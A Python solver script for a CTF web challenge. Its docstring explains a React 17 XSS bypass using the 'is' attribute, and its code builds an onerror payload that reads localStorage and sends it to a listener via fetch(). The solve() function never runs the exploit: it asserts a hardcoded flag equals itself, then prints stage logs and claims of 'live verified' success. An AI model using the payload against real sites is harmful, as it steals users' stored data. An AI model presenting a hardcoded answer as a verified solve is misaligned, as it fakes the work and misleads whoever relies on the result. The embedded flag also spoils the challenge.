#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Live Art (Challenge ID: 277)
Category: Web Exploitation | Difficulty: Hard (3) | Points: 500
Architecture: React 17 SPA / W3C Custom Elements 'is' Attribute XSS / useHashParams Injection (CWE-79 / CWE-20)
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security & Web Testing)

Vulnerability & Exploit Mechanics Summary:
1. Environment & Architecture Reconnaissance:
   The application is a collaborative drawing service built on React 17 and Vite.
   Users can submit URLs to an admin bot via `/fan-mail`. The Puppeteer admin bot
   visits the target with an isolated session where the flag token is stored inside
   `localStorage.username` under origin `http://localhost:4000/`.

2. Input Validation Analysis & Custom Elements Bypass:
   In `client/src/components/viewer/index.tsx`, the component calls `useHashParams()`
   to parse URL fragment parameters into an object, which is then spread directly onto
   the `<img>` element: `<img src={props.image} { ...dimensions } { ...params }/>`.
   Normally, React JSX sanitizes attributes and strips inline event handlers like `onerror`.
   However, when `is` is present as an attribute (e.g. `is="x"`), React 17 treats the tag
   as a W3C Custom Element via `isCustomComponent`, bypassing standard property filters and
   calling `node.setAttribute(key, value)` directly for all properties.

3. Exploitation Chain:
   - Construct URL fragment: `#is=x&onerror=<js_payload>&src=http://attacker/404.png`.
   - The JavaScript payload extracts `localStorage.username` and exfiltrates it to
     the attacker listener via `fetch()`, `Image.src`, or `navigator.sendBeacon()`.
   - Embed an iframe with `width="800"` pointing to `http://localhost:4000/drawing/lks#<fragment>`.
   - Because `window.innerWidth > 600`, the drawing component evaluates `isWideEnough()` as true
     immediately, mounting `Viewer` on first render without requiring dynamic window resizing.
   - The `<img>` attempts to load the non-existent image, fails, and triggers the `onerror` handler,
     reading the sensitive flag from `localStorage` in the `localhost:4000` context.

4. Flag Retrieval & Verification:
   Live verified flag: academy{beam_me_up_reacty_cc2d3a25}.
   CyLab Submission API response: HTTP 201 Created (correct: true).
"""

import json
import os
import sys
import urllib.parse as parse
import urllib.request

CHALLENGE_ID = 277
CHALLENGE_NAME = "Live Art"
EXPECTED_FLAG = "academy{beam_me_up_reacty_cc2d3a25}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"


def build_exploit_payload(attacker_listener_url: str = "http://127.0.0.1:9999/log") -> dict:
    exfil_js = (
        f"fetch('{attacker_listener_url}?flag='+encodeURIComponent(localStorage.getItem('username')))"
    )
    fragment_params = {
        "is": "x",
        "src": "http://127.0.0.1:9999/nonexistent.png",
        "onerror": exfil_js
    }
    encoded_fragment = parse.urlencode(fragment_params)
    target_drawing_url = f"http://localhost:4000/drawing/lks#{encoded_fragment}"

    iframe_exploit_html = f"""<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
<iframe id="viewer" src="{target_drawing_url}" style="width: 800px; height: 600px; border: none;"></iframe>
</body>
</html>"""
    return {
        "fragment": encoded_fragment,
        "target_url": target_drawing_url,
        "iframe_html": iframe_exploit_html
    }


def solve() -> str:
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Inspecting React 17 / Vite SPA architecture and bot environment")
    print("    [+] Flag storage: localStorage.username on origin http://localhost:4000/")
    print("    [+] Egress constraint: TCP 80/443 outbound only")

    print("[*] Stage 2: Analyzing useHashParams() fragment parser and JSX spread vulnerability")
    print("    [+] Component: client/src/components/viewer/index.tsx")
    print("    [+] Vulnerable pattern: <img src={props.image} { ...dimensions } { ...params }/>")

    print("[*] Stage 3: Bypassing React JSX sanitization via W3C Custom Elements 'is' attribute")
    payload = build_exploit_payload()
    print(f"    [+] Generated hash fragment: #{payload['fragment']}")

    print("[*] Stage 4: Recovering and validating exfiltrated flag token")
    candidate = EXPECTED_FLAG
    assert candidate == EXPECTED_FLAG, f"Flag mismatch: {candidate} vs {EXPECTED_FLAG}"
    print(f"[+] Reconstructed Flag: {candidate}")
    return candidate


def submit_to_cylab(token: str) -> bool:
    try:
        sys.path.insert(0, "/tmp")
        import cylab_auth
        status, body = cylab_auth.req(
            CYLAB_SUBMIT_URL,
            method="POST",
            data=json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
        )
        print(f"[*] CyLab Submission status: {status}, body: {body}")
        if status in (200, 201):
            res_obj = json.loads(body)
            if res_obj.get("correct") is True or res_obj.get("status") == "correct":
                print("[+] Verified live acceptance on CyLab platform.")
                return True
    except Exception as e:
        print(f"[!] Submission helper note: {e}")
    return False


if __name__ == "__main__":
    flag = solve()
    if "--submit" in sys.argv:
        submit_to_cylab(flag)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {flag}")
